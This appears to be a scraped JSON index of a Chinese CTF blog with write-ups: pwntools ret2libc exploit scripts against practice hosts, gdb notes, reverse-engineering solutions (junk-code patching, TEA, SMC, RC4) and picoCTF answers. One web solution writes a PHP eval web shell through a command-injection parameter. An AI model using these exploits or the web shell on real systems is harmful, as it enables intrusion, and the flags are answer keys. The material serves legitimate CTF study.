123456789101112131415161718192021222324252627282930313233343536from pwn import *from LibcSearcher import *context.log_level = &#x27;debug&#x27;#p = process(&#x27;./babyrop2&#x27;)p = remote(&quot;node5.buuoj.cn&quot;,25235)elf = ELF(&#x27;./babyrop2&#x27;)pop_rdi = 0x0000000000400733pop_rsi_r15 = 0x0000000000400731 format_str = 0x0000000000400770 ret_addr = 0x0000000000400734printf_plt = elf.plt[&#x27;printf&#x27;]read_got = elf.got[&#x27;read&#x27;]main_plt = 0x400636payload = b&#x27;a&#x27;*0x28+p64(pop_rdi)+p64(format_str)payload+=p64(pop_rsi_r15)+p64(read_got)+p64(0)payload+=p64(printf_plt)+p64(main_plt)p.recvuntil(b&quot;name? &quot;)p.sendline(payload)read= u64(p.recvuntil(b&quot;\\x7f&quot;)[-6:] + b&#x27;\\0\\0&#x27;)print(hex(read))libc = LibcSearcher(&#x27;read&#x27;, read)libc_base = read - libc.dump(&#x27;read&#x27;)sys_addr = libc_base + libc.dump(&#x27;system&#x27;)bin_sh = libc_base + libc.dump(&#x27;str_bin_sh&#x27;)payload = b&#x27;a&#x27;*0x28+p64(pop_rdi)+p64(bin_sh)+p64(sys_addr)p.sendline(payload)p.interactive() 单个函数pwn2_sctf_2016 首先看到题目输入一个小于32的数，并把这个数当作get输入的最大限制 所以可以输入一个负数来解决这个限制 也是没有system函数的相关内容 考虑泄露libc的地址 :detective:用printf打印，可以用printf的got表、 因为你调用了 printf(printf_got)。 对于 printf 来说： 它看不到这是一个整数地址 它只是把你给的指针当作一个字符串格式解析 如果你传入的这个地址是可读的内存，它就会按照那块内存的内容当作字符串去输出 所以如果只是传一个参数，printf函数会刚好把它当作字符串 刚好解决了传递它本身的got表地址，和只有一个参数的问题 1payload=b&#x27;a&#x27; * (0x2c+4) + p32(printf_plt) + p32(main) + p32(printf_got) 之后就是标准流程 就是记得返回地址是main函数 要再次输入依次那个负数 脚本 123456789101112131415161718192021222324252627282930from pwn import *from LibcSearcher import *from time import sleepr = remote(&quot;node5.buuoj.cn&quot;,28640)elf = ELF(&#x27;./pwn2_sctf_2016&#x27;)printf_plt = elf.plt[&#x27;printf&#x27;]printf_got = elf.got[&#x27;printf&#x27;]main= elf.sym[&#x27;main&#x27;]r.recvuntil(b&#x27;read?&#x27;)r.sendline(b&#x27;-1&#x27;)r.recvuntil(b&quot;data!\\n&quot;)payload = b&#x27;a&#x27; * (0x2c+4)payload += p32(printf_plt) + p32(main) + p32(printf_got)r.sendline(payload)r.recvuntil(&#x27;\\n&#x27;)printf_addr=u32(r.recv(4))#接受libc = LibcSearcher(&#x27;printf&#x27;,printf_addr)base = printf_addr - libc.dump(&#x27;printf&#x27;)system_addr = base + libc.dump(&#x27;system&#x27;)bin_sh = base + libc.dump(&#x27;str_bin_sh&#x27;)r.recvuntil(b&#x27;How many bytes do you want me to read?&#x27;)r.sendline(b&#x27;-1&#x27;)r.recvuntil(b&quot;data!\\n&quot;)payload = b&#x27;a&#x27; * (0x2c+4) + p32(system_addr) + p32(main) + p32(bin_sh)r.sendline(payload)r.interactive()","categories":[{"name":"exercise_pwn","slug":"exercise-pwn","permalink":"http://example.com/categories/exercise-pwn/"}],"tags":[{"name":"ret2libc-printf","slug":"ret2libc-printf","permalink":"http://example.com/tags/ret2libc-printf/"},{"name":"stack","slug":"stack","permalink":"http://example.com/tags/stack/"}]},{"title":"gdb调试","slug":"控制命令","date":"2025-07-16T03:04:42.000Z","updated":"2025-08-30T11:58:21.219Z","comments":true,"path":"2025/07/16/控制命令/","permalink":"http://example.com/2025/07/16/%E6%8E%A7%E5%88%B6%E5%91%BD%E4%BB%A4/","excerpt":"","text":"TAB：显示所有命令 start:运行到程序入口处 run:运行完整个程序 🔍 x 命令的基本语法：x&#x2F;nfs address n ：要显示的内存单元个数（默认是 1）。 f ：显示格式（format），比如十六进制、十进制、字符串等。 s ：内存单元大小（size），比如字节、半字、字等。 address ：要查看的内存地址（可以是变量名、寄存器、指针表达式等）。 f：输出格式（format） x Hex（十六进制） d Decimal（十进制） u Unsigned decimal o Octal（八进制） t Binary（二进制） f Floating point（浮点数） a Address（地址，显示指针） i Instruction（反汇编指令） c Char（字符） s String（字符串） s：内存单元大小（size） b byte（字节） 1 字节 h halfword（半字） 2 字节 w word（字） 4 字节 g giant word（双字） 8 字节 🧠 示例用法 1.查看地址 0x7fffffffe000 处的 4 个 4 字节数值，以十六进制显示： 1x/4wx 0x7fffffffe000 输出 10x7fffffffe000: 0x00000001 0x00007fff 0x00000000 0x00000000 2. 查看地址 0x400500 处的 5 条汇编指令： 1x/5i 0x400500 输出 123450x400500: push %rbp0x400501: mov %rsp,%rbp0x400504: sub $0x10,%rsp0x400508: mov %edi,-0x4(%rbp)0x40050b: mov %rsi,-0x10(%rbp) 3. 查看栈顶指针 rsp 地址的内容（以 8 字节为单位，显示为十六进制）： 1x/gx $rsp 输出 1x/gx $rsp 4. 查看地址 0x7fffffffe010 开始的字符串： 1x/s 0x7fffffffe010 输出 10x7fffffffe010: &quot;Hello, world!&quot; 5.查看地址 0x601038 的 10 个字节，以十进制形式显示： 1x/10db 0x601038 输出 10x601038: 72 101 108 108 111 44 32 119 111 114 :small_airplane:接收数据 函数 说明 recvall() 接收所有数据直到 EOF recvline() 接收一行（以\\n结尾） recvuntil(delim) 接收数据直到遇到指定分隔符（如&quot;Welcome!&quot;） recvregex(regex) 接收数据直到匹配正则表达式 recv(n) 接收指定字节数的数据（阻塞直到收到 n 字节）","categories":[{"name":"pwn_study","slug":"pwn-study","permalink":"http://example.com/categories/pwn-study/"}],"tags":[{"name":"PWN","slug":"PWN","permalink":"http://example.com/tags/PWN/"},{"name":"gdb","slug":"gdb","permalink":"http://example.com/tags/gdb/"}]},{"title":"御网杯线下2025","slug":"御网杯2025线下","date":"2025-07-14T13:48:44.000Z","updated":"2025-08-26T09:07:19.831Z","comments":true,"path":"2025/07/14/御网杯2025线下/","permalink":"http://example.com/2025/07/14/%E5%BE%A1%E7%BD%91%E6%9D%AF2025%E7%BA%BF%E4%B8%8B/","excerpt":"","text":"re_c FLAG:flag{HNCTFmng1} re_python 得到 脚本 12345678910c = [144, 163, 158, 177, 121, 39, 58, 58, 91, 111, 25, 158, 72, 53, 152, 78, 171, 12, 53, 105, 45, 12, 12, 53, 12, 171, 111, 91, 53, 152, 105, 45, 152, 144, 39, 171, 45, 91, 78, 45, 158, 8]flag=&quot;&quot;for i in range(42): for j in range (128): if j * 33 % 179 == c[i]: flag+=chr(j)print(flag)#flag&#123;2889e7a3-0d6b-4cbb-b6e9-04c0f26c9dca&#125; 再替换一下 crypto1 放到随波逐流里面能看到Rot13解码之后是明显的16进制编码形式 经过16进制转字符后特征很明显，最后Base32-&gt;Base64-&gt;Ascii85混合解码得到flag。 Crypto_10看到题目描述重排时序 62星序猜测倒序和Base62。 倒序： Base62解码： crypto解压这个文件夹打开下载的附件，有一个压缩包和一张图片。直接解压文件夹需要密码，图片也不能直接打开。 图片用010打开发现文件头是错的修改一下，得到解压密码。 压缩包解压得到flag.jpg直接放随波逐流里然后base64解码。 得到ctf_you_passed包裹flag{}就是最后的flag。 crypto encryption21234567891011121314151617181920212223242526272829303132333435from secret import init1,init2,init3,FLAGimport hashlibassert(FLAG==&quot;flag&#123;&quot;+hashlib.sha256(init1+init2+init3).hexdigest()+&quot;&#125;&quot;)classlfsr(): def__init__(self, init, mask, length): self.init = init self.mask = mask self.lengthmask = 2**(length+1)-1 defnext(self): nextdata = (self.init &lt;&lt; 1) &amp; self.lengthmask i = self.init &amp; self.mask &amp; self.lengthmask output = 0 while i != 0: output ^= (i &amp; 1) i = i &gt;&gt; 1 nextdata ^= output self.init = nextdata return outputdefcombine(x1,x2,x3): return (x1*x2)^(x2*x3)^(x1*x3)if __name__==&quot;__main__&quot;: l1 = lfsr(int.from_bytes(init1,&quot;big&quot;),0b100000000000000000000000010000000000000000000000,48) l2 = lfsr(int.from_bytes(init2,&quot;big&quot;),0b100000000000000000000000000000000010000000000000,48) l3 = lfsr(int.from_bytes(init3,&quot;big&quot;),0b100000100000000000000000000000000000000000000000,48) withopen(&quot;keystream&quot;,&quot;wb&quot;) as f: for i inrange(8192): b = 0 for j inrange(8): b = (b&lt;&lt;1)+combine(l1.next(),l2.next(),l3.next()) f.write(chr(b).encode()) Misc1题目附件是一个加密的压缩包，直接爆破。 打开文档全选复制 粘贴一下就能看到flag Misc2 键盘流量 Misc3 数据包分析附件里的.exe是压缩包，修改后缀解压。 找到流量包全局搜索flag以及flag其他编码形式。 16进制解码 Misc4工业流量分析 按照时间排序，最先STOP的包。 1flag&#123;ac6417423bb3000c&#125; web rce方法一（打印编码的flag）1ip/?cmd=print(base64_encode(file_get_contents(base64_decode(&quot;ZmxhZy5waHA=&quot;)))); 方法二（写入webshell）直接写入一个webshell 1234file_put_contents( base64_decode(&quot;c2hlbGwucGhw&quot;), // &quot;shell.php&quot; base64_decode(&quot;PD9waHAgQGV2YWwoJF9QT1NUW3hdKTs/Pg==&quot;) // &quot;&lt;?php @eval(\\$_POST[x]); ?&gt;&quot;); 进行编码后为： 1ip/?cmd=file_put_contents(base64_decode(&quot;c2hlbGwucGhw&quot;),base64_decode(&quot;PD9waHAgQGV2YWwoJF9QT1NUW3hd web 二次编码直接访问/flag.php就可以得到flag.php web sql直接用sqlmap。","categories":[{"name":"WP","slug":"WP","permalink":"http://example.com/categories/WP/"}],"tags":[{"name":"WP","slug":"WP","permalink":"http://example.com/tags/WP/"}]},{"title":"[HNCTF 2022 WEEK4]flower plus","slug":"HNCTF-2022-WEEK4-flower-plus","date":"2025-07-14T00:49:30.000Z","updated":"2025-08-30T11:56:15.374Z","comments":true,"path":"2025/07/14/HNCTF-2022-WEEK4-flower-plus/","permalink":"http://example.com/2025/07/14/HNCTF-2022-WEEK4-flower-plus/","excerpt":"","text":"链接 花指令分析 发现花指令 db 0C7h 的“垃圾”作用： 0x4012A6 处的 db 0C7h 是一个数据字节。它被 jnz 指令跳转到，但它本身不是一个有意义的执行路径。它的存在是为了干扰反汇编器的线性分析，使其认为这里存在一个实际的代码分支。反汇编器可能会将 0C7h 解码为 MOV EDI, EBP (如果加上前缀的话)，或者只是一个数据字节，无论哪种，都与正常逻辑不符。 为了不影响汇编器的分析 要把这里进行判断和跳转的都NOP掉 将 push ebx 和 pop ebx 都 NOP 掉的主要原因是为了完全消除这个花指令的副作用和混淆链： 栈平衡： push ebx 和 pop ebx 是一对用来维护栈平衡的操作。如果它们是花指令的一部分，并且它们保存&#x2F;恢复的寄存器值在中间被修改（例如被 xor ebx, ebx 清零），那么这对 push/pop 实际上是无效的或者说是误导性的。它们的存在只是为了让代码看起来更复杂，或者在某些情况下通过不匹配的栈操作来干扰分析。 如果只 NOP 掉中间的跳转，保留 push ebx 和 pop ebx，那么在 push ebx 之后，ebx 立即被清零，然后又被 pop ebx 恢复。这可能会导致 ebx 的值在函数中被不必要地改变和恢复，即使它不是真正需要的。 第二个花指令 执行 0x401358: call loc_40135E: call 指令本身占用 5 个字节 (E8 01 00 00 00)。 call 指令的下一条指令的地址是 0x401358 + 5 = 0x40135D。 CPU 将 0x40135D 压入栈中。此时，0x40135D 就是栈顶的返回地址。 CPU 跳转到 0x40135E 开始执行。 执行 0x40135E: db 36h: 这是一个数据字节，但是 CPU 会尝试将其作为指令执行。这通常是花指令的混淆手法，它可能不会导致崩溃，而是作为无效指令执行或者被后续指令覆盖。 假设它被执行了，或者被跳过了，程序流会继续到 0x40135F。 执行 0x40135F: add dword ptr [esp], 8: 这条指令非常关键。 [esp] 指的是栈顶的内存地址。当前栈顶存放的是 0x40135D（原始返回地址）。 add dword ptr [esp], 8 的作用是：将栈顶存放的那个 dword 值（即 0x40135D）加上 8，然后把结果再写回栈顶。 所以，栈顶的返回地址从 0x40135D 变成了 0x40135D + 8 = 0x401365。 执行 0x401362: retn: retn 指令会从栈顶弹出地址。 它弹出的不再是原始的 0x40135D，而是被 add 指令修改后的 0x401365。 CPU 跳转到 0x401365 开始执行。 原始的返回地址是 0x40135D。如果没有任何 add 操作，retn 会回到 0x40135D。 但是，add dword ptr [esp], 8 将返回地址修改成了 0x401365。 这意味着当 retn 执行时，程序会直接从 0x401365 开始执行， 所以，add dword ptr [esp], 8 的作用就是人为地调整了 retn 的目标地址，使其跳过了 0x40135D 到 0x401364（包含 0x401364）这段区域，直接跳转到 0x401365 去执行。 这就是这种花指令用于混淆控制流的一种常见手法。 所以NOP的范围包括0x401364 为什么是花指令 正常情况下，call 指令会直接跳转到被调用函数的入口点。这个入口点应该是一条合法的可执行指令。 但是在这里，当 call 指令跳转到 0x40135E 时，它遇到的第一个字节是 db 36h。 反汇编器困惑： 静态反汇编器在 0x40135E 看到 db 36h 时，通常会认为这是数据，而不是代码。它可能因此停止对该区域的代码分析，或者产生错误的解码。 CPU 行为： CPU 会尝试将 36h 作为指令来解码执行。如前所述，36h 是一个段超越前缀（SS:）。CPU 会尝试将其与随后的字节组合成一条指令。 如果 36h 后面跟着的字节（即 add dword ptr [esp], 8 的字节码 83）不能与 36h 形成一条合法的指令，或者形成了程序员不期望的指令，这就会导致程序行为异常或崩溃。 然而，在某些复杂的混淆中，可能会利用这种前缀的特性，使得处理器在特定上下文中能正确执行，而反汇编器却难以理解。 call花指令识别 call 目标是数据字节或非指令区。 call 后面紧跟数据定义。 call 目标内部有 add dword ptr [esp], N 来修改返回地址。 最后以 retn 结束，并且 retn 之后的字节可能也是混淆的一部分。 脚本1234567891011121314stae=0x00401006end=0x00401402 for i in range(stae, end+1): if get_wide_dword(i)== 0x01740275: patch_dword(i,0x90909090) patch_dword(i-4,0x90909090) patch_word(i+4,0x9090) patch_word(i-5,0x90) if get_wide_dword(i)== 0x000001E8: if get_wide_dword(i+4)== 0x8336E800: patch_dword(i,0x90909090) patch_dword(i+4,0x90909090) patch_dword(i+8,0x90909090) patch_byte(i+12,0x90) 然后选中函数头U解构 C重构一下就好 就可以看待main函数了 在这个函数中看到RC4的标志 之后经过一个异或 然后进入sub_40128F进行核验 这是其加密后的值 右键 提取数据 异或脚本 123456789101112131415161718192021222324252627a=[0x0000004D, 0xFFFFFFE6, 0x00000049, 0xFFFFFF95, 0x00000003, 0x0000002D, 0x0000002B, 0xFFFFFFBA, 0xFFFFFFEA, 0x0000006D, 0xFFFFFFFF, 0x00000059, 0x00000070, 0x00000000, 0x0000001B, 0xFFFFFFA9, 0x0000002C, 0xFFFFFFB0, 0x00000032, 0xFFFFFF98, 0x0000006F, 0xFFFFFF8C, 0x00000056, 0xFFFFFFA2, 0x0000004C, 0x00000079, 0x0000007F]for i in range(len(a)-1,-1,-1): a[i]^=a[(i+1)%len(a)] print(a[i], end=&#x27; &#x27;)decimal_numbers =ahex_output = []for num in decimal_numbers: unsigned_32bit_num = num &amp; 0xFFFFFFFF hex_str = hex(unsigned_32bit_num)[2:].upper().zfill(8) hex_output.append(&quot;0x&quot; + hex_str)for i in range(0, len(hex_output), 4): print(&quot;, &quot;.join(hex_output[i:i+4])) #十进制50 75 7 4294967205 4294967283 127 16 4294967176 4294967226 10 38 4294967183 4294967188 4294967188 4294967268 4294967229 66 47 4294967237 127 84 121 122 4294967279 4294967206 64 13 #十六进制0x0000000D, 0x00000040, 0xFFFFFFA6, 0xFFFFFFEF0x0000007A, 0x00000079, 0x00000054, 0x0000007F0xFFFFFFC5, 0x0000002F, 0x00000042, 0xFFFFFFBD0xFFFFFFE4, 0xFFFFFF94, 0xFFFFFF94, 0xFFFFFF8F0x00000026, 0x0000000A, 0xFFFFFFBA, 0xFFFFFF880x00000010, 0x0000007F, 0xFFFFFFF3, 0xFFFFFFA50x00000007, 0x0000004B, 0x00000032 ​ 处理RC4 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990def to_unsigned_32bit_and_byte(n): if n &lt; 0: n += 0x100000000 return n &amp; 0xFFdef to_signed_32bit(n): if n &gt; 0x7FFFFFFF: n -= 0x100000000 return ndef to_unsigned_32bit(n): if n &lt; 0: n += 0x100000000 return n &amp; 0xFFFFFFFF# --- RC4 阶段 1: KSA (密钥调度算法) ---# 定义: 初始化 S 盒并根据密钥对其进行置换。# 输入: 密钥字节 (key_bytes), 密钥长度模数 (key_mod_len)# 输出: 经过初始置换的 S 盒 (s_box)def s_init(key_bytes, key_mod_len): s_box = list(range(256)) v4_ksa_t_box = [key_bytes[i % key_mod_len] for i in range(256)] j = 0 for i in range(256): j = (v4_ksa_t_box[i] + j + s_box[i]) % 256 s_box[i], s_box[j] = s_box[j], s_box[i] return s_box# --- RC4 阶段 2 &amp; 3: PRGA (伪随机生成算法) &amp; 最终数据处理 ---# 定义:# PRGA: 根据 S 盒生成伪随机密钥流。# 最终数据处理: 使用生成的密钥流对输入数据进行异或操作。# 输入: 待处理数据数组 (data_array), 密钥字节 (key_bytes), # 密钥长度模数 (key_mod_len), 数据长度 (data_len)# 输出: 经过处理后的数据数组 (result_am_array)def rc4_variant_process(data_array, key_bytes, key_mod_len, data_len): # KSA 阶段的调用 s_box = s_init(key_bytes, key_mod_len) l = 0 v9 = 0 # 用于存储生成的密钥流 generated_keystream = [0] * data_len # --- RC4 阶段 2: PRGA (生成密钥流) --- for k in range(data_len): l = (l + 3) % 256 v9 = (v9 + s_box[l] + 1) % 256 s_box[l], s_box[v9] = s_box[v9], s_box[l] generated_keystream[k] = s_box[(s_box[v9] + s_box[l]) % 256] # --- RC4 阶段 3: 最终数据处理 (异或操作) --- result_am_array = list(data_array) for i in range(data_len): result_am_array[i] = to_signed_32bit(to_unsigned_32bit(result_am_array[i]) ^ to_unsigned_32bit(generated_keystream[i])) return result_am_arrayif __name__ == &quot;__main__&quot;: rc4_key_string = &#x27;Hello_Ctfers!!!&#x27; key_as_byte_list = list(map(ord, rc4_key_string)) if len(key_as_byte_list) &lt; 16: key_as_byte_list.append(0) KEY_MOD_LEN = 16 am_initial_hex = [ 0x0000000D, 0x00000040, 0xFFFFFFA6, 0xFFFFFFEF, 0x0000007A, 0x00000079, 0x00000054, 0x0000007F, 0xFFFFFFC5, 0x0000002F, 0x00000042, 0xFFFFFFBD, 0xFFFFFFE4, 0xFFFFFF94, 0xFFFFFF94, 0xFFFFFF8F, 0x00000026, 0x0000000A, 0xFFFFFFBA, 0xFFFFFF88, 0x00000010, 0x0000007F, 0xFFFFFFF3, 0xFFFFFFA5, 0x00000007, 0x0000004B, 0x00000032 ] am_initial_data = [to_signed_32bit(h) for h in am_initial_hex] n = len(am_initial_data) final_am_values = rc4_variant_process(am_initial_data, key_as_byte_list, KEY_MOD_LEN, n) output_chars = bytearray() for val in final_am_values: output_chars.append(to_unsigned_32bit_and_byte(val)) print(output_chars.decode(&#x27;latin-1&#x27;)) #NSSCTF&#123;Hn_CtF_w111_end_Lol&#125;","categories":[{"name":"exercise_re","slug":"exercise-re","permalink":"http://example.com/categories/exercise-re/"}],"tags":[{"name":"RE","slug":"RE","permalink":"http://example.com/tags/RE/"},{"name":"花指令","slug":"花指令","permalink":"http://example.com/tags/%E8%8A%B1%E6%8C%87%E4%BB%A4/"}]},{"title":"[HDCTF 2023]enc","slug":"HDCTF-2023-enc","date":"2025-07-11T11:35:05.000Z","updated":"2025-08-26T08:57:06.710Z","comments":true,"path":"2025/07/11/HDCTF-2023-enc/","permalink":"http://example.com/2025/07/11/HDCTF-2023-enc/","excerpt":"","text":"链接 打开进入这个函数 TEA 分析之后知道 下一步核对的v7和v8都是改变后的密文 v9才是密钥 解密时注意，异或的时候从后往前异或，倒着来 脚本 1234567891011121314151617#tea解密def tea_decrypt(v, k): v0, v1 = v[0], v[1] delta = 0x61C88647 sum = -(delta * 32) &amp; 0xFFFFFFFF for _ in range(32): v1 = (v1 - ((16*v0 + k[2]) ^ (v0 + sum) ^((v0 &gt;&gt;5) + k[3]))) &amp; 0xFFFFFFFF v0 = (v0 - ((16*v1+ k[0]) ^ (v1 + sum) ^((v1 &gt;&gt;5) + k[1]))) &amp; 0xFFFFFFFF sum = (sum + delta) &amp; 0xFFFFFFFF return [v0, v1] # 给定密文v9和密钥v10v9 = [0x60fcdef7,0x236dbec]v10 = [0x12,0x34,0x56,0x78]print(tea_decrypt(v9, v10))//key=3 SMC继续看下面的函数 sub_4113DE —&gt;sub_414C10—&gt;sub_411046—&gt;sub_414B00—&gt;sub_411221—&gt;sub_415340 (char *)a1 或 (_BYTE *)a1 是将整数地址 a1 转换为内存指针。 然后通过 *ptr ^= a3 修改该地址上的内容。 所以是SMC 那下一步就是找到它改变的地址的范围 打开x32xdbg ctrl+g输入00415340 F9运行后会停在这里 所以修改位置的位置头是0x0041D000 长度是0x600 所以在ida中运行脚本 脚本 1234567891011121314151617# 导入 ida_bytes 模块，这是现代 IDA Python 推荐的字节操作方式from ida_bytes import get_byte, patch_byte # 定义操作的起始地址、结束地址和异或密钥start_address = 0x41d000end_address = 0x41E600 # range函数不包含end_addressxor_key = 3 print(&quot;开始批量异或修改...&quot;)# 遍历指定范围内的每个字节并进行异或操作for i in range(start_address, end_address): original_byte = get_byte(i) # 使用 get_byte 从 ida_bytes 模块读取字节 new_byte = original_byte ^ xor_key patch_byte(i, new_byte) # 使用 patch_byte 从 ida_bytes 模块写入字节print(&quot;修改完成&quot;) 之后再在函数头按U结构 再选中范围去C 就可以了 发现是RC4加密 脚本 12345678910111213141516171819202122232425262728293031323334key=list(&#x27;you_are_master&#x27;)content=[0xf,0x94,0xae,0xf2,0xc0,0x57,0xc2,0xe0,0x9a,0x45,0x37,0x50,0xf5,0xa0,0x5e,0xcb,0x2c,0x16,0x28,0x29,0xfe,0xff,0x33,0x46,0xe,0x57,0x82,0x22,0x52,0x26,0x2b,0x6e,0xe4,0x82,0x24]rc4number=0x100s=[0]*rc4numberflag=&#x27;&#x27; def rc4_init(s,key,rc4number): for i in range(rc4number): s[i]=i j=0 for i in range(rc4number): j=(j+s[i]+ord(key[i%len(key)]))%rc4number temp=s[i] s[i]=s[j] s[j]=temp def rc4_endecode(s,content,rc4number): i=0 j=0 for k in range(len(content)): i=(i+1)%rc4number j=(j+s[i])%rc4number temp=s[i] s[i]=s[j] s[j]=temp t=(s[i]+s[j])%rc4number content[k]=chr(content[k]^s[t]) content=&#x27;&#x27;.join(content) print(content) rc4_init(s,key,rc4number)rc4_endecode(s,content,rc4number)","categories":[{"name":"exercise_re","slug":"exercise-re","permalink":"http://example.com/categories/exercise-re/"}],"tags":[{"name":"RE","slug":"RE","permalink":"http://example.com/tags/RE/"},{"name":"TEA","slug":"TEA","permalink":"http://example.com/tags/TEA/"},{"name":"SMC","slug":"SMC","permalink":"http://example.com/tags/SMC/"}]},{"title":"picoCTF2022","slug":"picoCTF2022","date":"2025-07-10T04:06:13.000Z","updated":"2025-08-26T09:12:57.292Z","comments":true,"path":"2025/07/10/picoCTF2022/","permalink":"http://example.com/2025/07/10/picoCTF2022/","excerpt":"","text":"CRYPTOVigenere题目信息 key CYLAB cipher: rgnoDVD&#123;O0NU_WQ3_G1G3O3T3_A1AH3S_cc82272b&#125; 题目给了密文和密钥，用随波逐流打开，解密，发现是维吉尼亚加密 flag:picoCTF{D0NT_US3_V1G3N3R3_C1PH3R_ae82272q} basic-mod1题目信息 描述： 我们发现这个奇怪的消息在服务器上传递，我们认为我们有一个有效的 decrpytion 方案。取每个数字 mod 37 并将其映射到以下字符集：0-25 是字母表（大写），26-35 是十进制数字，36 是下划线。以 picoCTF 标志格式包装解密的消息（即 picoCTF{decrypted_message}） 数字：350 63 353 198 114 369 346 184 202 322 94 235 114 110 185 188 225 212 366 374 261 213 按照题目信息对取模厚的数字根据其ASCLL码修改，并转化为字符输出 123456789101112131415161718def simplify_numbers(numbers): result = [] for num in numbers: remainder = num % 37 if 0 &lt;= remainder &lt;= 25: result.append(chr(ord(&#x27;A&#x27;) + remainder)) elif 26 &lt;= remainder &lt;= 35: result.append(str(remainder - 26)) elif remainder == 36: result.append(&#x27;_&#x27;) else: result.append(f&quot;[&#123;remainder&#125;]&quot;) return &quot;&quot;.join(result)my_numbers = [350, 63, 353, 198, 114, 369, 346, 184, 202, 322, 94, 235, 114, 110, 185, 188, 225, 212, 366, 374, 261, 213]simplified_string = simplify_numbers(my_numbers)print(simplified_string) flag：picoCTF{R0UND_N_R0UND_ADD17EC2} substitution0题目信息 描述： 一条消息进来了，但似乎全都乱七八糟。幸运的是，它似乎一开始就有钥匙。你能破解这个替换密码吗？ 密文： OHNFUMWSVZLXEGCPTAJDYIRKQB Suauypcg Xuwaogf oacju, rvds o waoiu ogf jdoduxq ova, ogf hacywsd eu dsu huudxumace o wxojj noju vg rsvns vd roj ugnxcjuf. Vd roj o huoydvmyx jnoaohouyj, ogf, oddsod dveu, yglgcrg dc godyaoxvjdj—cm ncyaju o wauod pavbu vg o jnvugdvmvn pcvgdcm ivur. Dsuau ruau drc acygf hxonl jpcdj guoa cgu ukdauevdq cm dsu honl, ogf oxcgw cgu guoa dsu cdsua. Dsu jnoxuj ruau uknuufvgwxq soaf ogf wxcjjq, rvds oxx dsuoppuoaognu cm hyagvjsuf wcxf. Dsu ruvwsd cm dsu vgjund roj iuaq aueoalohxu, ogf,dolvgw oxx dsvgwj vgdc ncgjvfuaodvcg, V ncyxf soafxq hxoeu Zypvdua mca svj cpvgvcgaujpundvgw vd. Dsu mxow vj: pvncNDM&#123;5YH5717Y710G_3I0XY710G_03055505&#125; 解密 猜测密钥凯撒密码加密，把第一句作为密钥 flag; picoCTF{5UB5717U710N_3V0LU710N_03055505} RESafe Opener题目信息 描述：你能打开这个保险箱吗？我忘记了保险箱的钥匙，但这个程序应该可以帮助我找回丢失的钥匙。你能帮我打开保险箱吗？将您恢复的密码放入 picoCTF 标志格式，例如：picoCTF{password} 代码 123456789101112131415161718192021222324252627282930313233343536373839404142import java.io.*;import java.util.*; public class SafeOpener &#123; public static void main(String args[]) throws IOException &#123; BufferedReader keyboard = new BufferedReader(new InputStreamReader(System.in)); Base64.Encoder encoder = Base64.getEncoder();//Base6的编码器 String encodedkey = &quot;&quot;; String key = &quot;&quot;; int i = 0; boolean isOpen; while (i &lt; 3) &#123; System.out.print(&quot;Enter password for the safe: &quot;); key = keyboard.readLine(); encodedkey = encoder.encodeToString(key.getBytes());//对密码进行Base64加密 System.out.println(encodedkey); isOpen = openSafe(encodedkey);//调用方法进行核对 if (!isOpen) &#123; System.out.println(&quot;You have &quot; + (2 - i) + &quot; attempt(s) left&quot;); i++; continue; &#125; break; &#125; &#125; public static boolean openSafe(String password) &#123; String encodedkey = &quot;cGwzYXMzX2wzdF9tM18xbnQwX3RoM19zYWYz&quot;;//BASE64加密后的结果 if (password.equals(encodedkey)) &#123; System.out.println(&quot;Sesame open&quot;); return true; &#125; else &#123; System.out.println(&quot;Password is incorrect\\n&quot;); return false; &#125; &#125;&#125; 正如代码中的注释一样，用户输入密码，进行Base64编码，调用函数检验编码厚的数值是否符合指定字符，所以密码就是指定字符Base64解码 flag：picoCTF{pl3as3_l3t_m3_1nt0_th3_saf3} GDB test题目信息 你能得到这面旗帜吗？ 以下是试用说明： 123456$ chmod +x gdbme$ gdb gdbme(gdb) layout asm(gdb) break *(main+99)(gdb) run(gdb) jump *(main+104) 解密 按照给的命令进行操作 flag: picoCTF{d3bugg3r_dr1v3_7776d758} fresh-java题目信息 你能得到这面旗帜吗？对这个 Java 程序进行逆向工程 用jad-gui打开这个文件，发现该密文已将被定义好了 flag：picoCTF{700l1ng_r3qu1r3d_738cac89} file-run1题目信息 已为您提供一个程序，如果您尝试在命令行上运行它会发生什么？ 解密 首先要为程序赋权限 chmod +x ru 运行该程序并且执行命令.&#x2F;run flag:picoCTF{U51N6_Y0Ur_F1r57_F113_9bc52b6b} file-run2题目信息 另一个程序，但这一次，它似乎需要一些输入。如果您尝试在命令行上运行它并输入 “Hello！”会发生什么情况？ 解密 首先要为程序赋权限 chmod +x ru 运行该程序并且执行命令.&#x2F;run Hello! flag:picoCTF{F1r57_4rgum3n7_f65ed63e} Bbbbloat题目信息 你能得到这面旗帜吗？对这个二进制文件进行逆向工程。 解密 分析得到，最喜欢的是数字应该为549255 为文件赋权限 chmod +x Bbbbloat 运行程序./Bbbbloat flag：picoCTF{cu7_7h3_bl047_44f74a60} unpackme题目描述 你能得到这面旗帜吗？对这个二进制文件进行逆向工程。 解密 文件以upx结尾，尝试upx脱壳 之后拖入ida中 发现最喜爱的数字是754635 flag: picoCTF{up&gt;&lt;_m3_f7w_e510a27f} PWNRPS题目描述 这是一个对你玩石头剪刀布的程序。我听说如果你连续赢了 5 次，就会发生好事。可以下载带有标记已编辑的程序源代码 这里 。 解密 主函数 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647int main () &#123; char input[3] = &#123;&#x27;\\0&#x27;&#125;; int command; int r; puts(&quot;Welcome challenger to the game of Rock, Paper, Scissors&quot;); puts(&quot;For anyone that beats me 5 times in a row, I will offer up a flag I found&quot;); puts(&quot;Are you ready?&quot;); while (true) &#123; puts(&quot;Type &#x27;1&#x27; to play a game&quot;); puts(&quot;Type &#x27;2&#x27; to exit the program&quot;); r = tgetinput(input, 3); // Timeout on user input if(r == -3) &#123; printf(&quot;Goodbye!\\n&quot;); exit(0); &#125; //前面那些都不重要 if ((command = strtol(input, NULL, 10)) == 0) &#123; puts(&quot;Please put in a valid number&quot;); &#125; else if (command == 1) &#123; printf(&quot;\\n\\n&quot;); if (play()) &#123; wins++; &#125; else &#123; wins = 0; &#125; if (wins &gt;= 5) &#123; puts(&quot;Congrats, here&#x27;s the flag!&quot;); puts(flag); &#125; &#125; else if (command == 2) &#123; return 0; &#125; else &#123; puts(&quot;Please type either 1 or 2&quot;); &#125; &#125; return 0;&#125; 判断胜负 1234567891011121314151617181920212223242526//判断胜负bool play 